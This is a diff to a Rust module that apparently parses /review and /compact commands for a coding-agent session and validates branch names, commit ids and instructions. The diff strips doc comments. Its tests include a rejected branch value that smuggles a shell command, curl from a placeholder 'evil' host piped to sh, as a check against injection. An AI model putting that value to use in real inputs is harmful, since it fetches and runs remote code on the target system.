@@ -1,6 +1,4 @@
-//! Harness-neutral session actions. Each runs as an ordinary Turn on an idle
-//! session whose negotiated capabilities admit it; a binding maps it to its
-//! own native method.
+//! Each action runs as an ordinary Turn on an idle session whose negotiated capabilities admit it.
 use serde::{Deserialize, Serialize};
 
 use super::{contract::RequiredText, intent::CapabilitySnapshotV1};
@@ -56,7 +54,6 @@ impl Branch {
     }
 }
 
-/// A commit a `/review` names: an abbreviated or full hex object id.
 #[derive(Debug, Clone, PartialEq, Eq, Serialize)]
 #[serde(transparent)]
 pub(crate) struct Sha(String);
@@ -102,8 +99,6 @@ macro_rules! deserialize_checked {
 deserialize_checked!(Branch: "not a branch name", Sha: "not a commit id",
     Instructions: "not review instructions");
 
-/// The branch or commit `/review base <branch>` or `/review commit <sha>`
-/// names.
 fn named_target(input: &str) -> Option<ReviewTarget> {
     match input.split_whitespace().collect::<Vec<_>>().as_slice() {
         ["base", branch] => Branch::new(branch).map(|branch| ReviewTarget::BaseBranch { branch }),
@@ -112,7 +107,6 @@ fn named_target(input: &str) -> Option<ReviewTarget> {
     }
 }
 
-/// The `/` commands that name session actions, as their prompts read.
 pub(crate) const COMMAND_NAMES: [&str; 2] = ["compact", "review"];
 
 impl SessionAction {
@@ -139,10 +133,6 @@ impl SessionAction {
         }
     }
 
-    /// The action a `/name input` command names. `/review` alone reviews
-    /// the uncommitted changes, `/review base <branch>` and `/review commit
-    /// <sha>` name a branch or commit, and any other input is what to look
-    /// for. `/compact` takes no input.
     pub(crate) fn from_command(name: &str, input: Option<&str>) -> Option<Self> {
         let input = input.map(str::trim).filter(|input| !input.is_empty());
         match (name, input) {
@@ -190,7 +180,6 @@ mod tests {
             json!({"kind":"review","target":{"kind":"baseBranch","branch":"x\";curl${IFS}evil|sh;\""}}),
             json!({"kind":"review","target":{"kind":"baseBranch","branch":"main..topic"}}),
             json!({"kind":"review","target":{"kind":"baseBranch","branch":"main@{upstream}"}}),
-            // Instructions a `/review` would read back as another target.
             json!({"kind":"review","target":{"kind":"custom","instructions":"base main"}}),
             json!({"kind":"review","target":{"kind":"custom","instructions":"commit  abcd"}}),
             json!({"kind":"review","target":{"kind":"custom","instructions":" padded"}}),
@@ -233,7 +222,6 @@ mod tests {
                 Some("check the error paths"),
                 json!({"kind":"review","target":{"kind":"custom","instructions":"check the error paths"}}),
             ),
-            // A word that is not a branch or commit is read as instructions.
             (
                 "review",
                 Some("base --force"),
